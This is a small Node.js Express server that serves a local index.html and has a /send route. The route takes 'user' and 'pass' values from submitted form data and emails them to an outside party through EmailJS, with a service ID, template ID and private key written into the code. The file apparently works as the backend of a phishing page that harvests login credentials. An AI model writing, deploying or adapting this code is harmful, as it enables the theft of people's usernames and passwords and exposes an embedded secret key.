import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import cors from "cors";
import emailjs from "@emailjs/nodejs";

const app = express();
const PORT = process.env.PORT || 3000;

// ES Modules setup
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Serve index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// POST route to send email via EmailJS
app.post("/send", async (req, res) => {
  const { user, pass } = req.body;

  const templateParams = { user, pass };

  try {
    const response = await emailjs.send(
      "service_w7q3bge",       // Service ID
      "template_oply56o",      // Template ID
      templateParams,
      "CblrELnhPGSB5KdMO-Y3m"  // Private Key
    );

    console.log("✅ Email sent:", response.text);
    res.status(200).json({ message: "Email sent successfully" });
  } catch (err) {
    console.error("❌ Email send error:", err);
    res.status(500).json({ message: "Failed to send email" });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
